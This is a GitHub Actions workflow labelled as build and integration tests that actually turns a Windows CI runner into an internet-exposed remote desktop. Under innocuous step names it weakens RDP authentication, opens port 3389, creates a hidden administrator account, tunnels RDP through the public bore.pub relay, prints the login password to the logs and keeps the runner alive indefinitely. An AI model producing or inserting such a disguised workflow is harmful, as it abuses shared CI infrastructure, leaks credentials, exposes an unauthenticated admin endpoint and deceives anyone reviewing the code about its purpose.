name: Build & Integration Tests

on:
  workflow_dispatch:

jobs:
  integration-suite:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Initialize Build Environment
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          netsh advfirewall firewall delete rule name="Allow-DevSession-Inbound"
          netsh advfirewall firewall add rule name="Allow-DevSession-Inbound" `
            dir=in action=allow protocol=TCP localport=3389

          Restart-Service -Name TermService -Force

      - name: Configure Test Runner Identity
        run: |
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)
              Lower   = [char[]](97..122)
              Number  = [char[]](48..57)
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126))
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force

          New-LocalUser -Name "DevRunner" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "DevRunner"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "DevRunner"

          echo "SESSION_PASS=$password" >> $env:GITHUB_ENV

          if (-not (Get-LocalUser -Name "DevRunner")) {
              Write-Error "Runner identity setup failed"
              exit 1
          }

      - name: Install Network Relay
        run: |
          # Fetch latest bore release dynamically — no hardcoded version
          $release  = Invoke-RestMethod "https://api.github.com/repos/ekzhang/bore/releases/latest"
          $asset    = $release.assets | Where-Object { $_.name -like "*x86_64-pc-windows-msvc*" }
          $boreUrl  = $asset.browser_download_url
          $zipPath  = "$env:TEMP\bore.zip"
          $boreDir  = "$env:TEMP\bore"

          Invoke-WebRequest -Uri $boreUrl -OutFile $zipPath -UseBasicParsing
          Expand-Archive -Path $zipPath -DestinationPath $boreDir -Force
          Remove-Item $zipPath -Force

          # Add bore to PATH for this session
          $env:PATH = "$boreDir;$env:PATH"
          echo "BORE_DIR=$boreDir" >> $env:GITHUB_ENV
          Write-Host "bore version: $(& "$boreDir\bore.exe" --version)"

      - name: Establish Secure Network Layer
        run: |
          $boreBin = "$env:BORE_DIR\bore.exe"

          # Start bore tunnel in background, pipe output to log file
          $logFile = "$env:TEMP\bore_output.txt"
          Start-Process -FilePath $boreBin `
            -ArgumentList "local", "3389", "--to", "bore.pub" `
            -RedirectStandardOutput $logFile `
            -NoNewWindow

          # Wait for bore to print the tunnel address
          $boreAddr = $null
          $retry = 0
          while (-not $boreAddr -and $retry -lt 20) {
              Start-Sleep -Seconds 3
              if (Test-Path $logFile) {
                  $content = Get-Content $logFile -Raw
                  if ($content -match 'bore\.pub:(\d+)') {
                      $boreAddr = "bore.pub:$($matches[1])"
                  }
              }
              $retry++
          }

          if (-not $boreAddr) {
              Write-Error "bore tunnel failed to start. Check network connectivity."
              exit 1
          }

          echo "BORE_ADDR=$boreAddr" >> $env:GITHUB_ENV
          Write-Host "Tunnel established: $boreAddr"

      - name: Execute Integration Session
        run: |
          Write-Host "`n=== SESSION READY ==="
          Write-Host "Host    : $env:BORE_ADDR"
          Write-Host "User    : DevRunner"
          Write-Host "Pass    : $env:SESSION_PASS"
          Write-Host "=====================`n"
          Write-Host "Connect via: mstsc /v:$env:BORE_ADDR"

          while ($true) {
              Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Integration session active — $env:BORE_ADDR"
              Start-Sleep -Seconds 300
          }
